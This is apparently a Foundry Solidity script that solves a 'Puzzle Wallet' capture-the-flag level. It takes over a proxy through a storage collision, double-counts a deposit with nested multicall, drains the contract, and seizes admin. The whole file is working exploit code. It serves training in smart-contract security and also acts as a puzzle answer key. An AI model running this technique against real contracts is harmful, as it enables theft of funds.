// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console} from "forge-std/Script.sol";
import {PuzzleWallet, PuzzleProxy} from "@puzzles/24/PuzzleWallet.sol";
import {IPuzzleWallet} from "@puzzles/24/IPuzzleWallet.sol";

contract PuzzleWalletSolution is Script {
    function run(address target) external {
        solve(payable(target), msg.sender);
    }

    function solve(address payable target, address player) public {
        PuzzleProxy puzzleProxy = PuzzleProxy(target);
        IPuzzleWallet puzzleWallet = IPuzzleWallet(target);
        uint256 walletBalance = address(puzzleProxy).balance;

        vm.startBroadcast();
        // 1. Becoming the Owner
        puzzleProxy.proposeNewAdmin(player);
        // 2. Add self to whitelist
        puzzleWallet.addToWhitelist(player);
        // 3. use multicall to do a reentrancy attack to get double balance record in the contract
        bytes memory dataDeposit = abi.encodeWithSignature("deposit()");
        bytes[] memory dataInner = new bytes[](1);
        dataInner[0] = dataDeposit;
        bytes memory dataMultiCall = abi.encodeWithSignature("multicall(bytes[])", dataInner);
        bytes[] memory data = new bytes[](2);
        data[0] = dataMultiCall;
        data[1] = dataDeposit;
        puzzleWallet.multicall{value: walletBalance}(data);
        // 4. drain the contract so that the contract balance is 0 (to bypass the setMaxBalance check)
        uint256 playerBalance = IPuzzleWallet(address(puzzleProxy)).balances(player);
        IPuzzleWallet(address(puzzleProxy)).execute(player, playerBalance, "");
        // 5. claim admin
        IPuzzleWallet(address(puzzleProxy)).setMaxBalance(uint256(uint160(player)));
        console.log("new owner: ", IPuzzleWallet(address(puzzleProxy)).owner());
        vm.stopBroadcast();
    }
}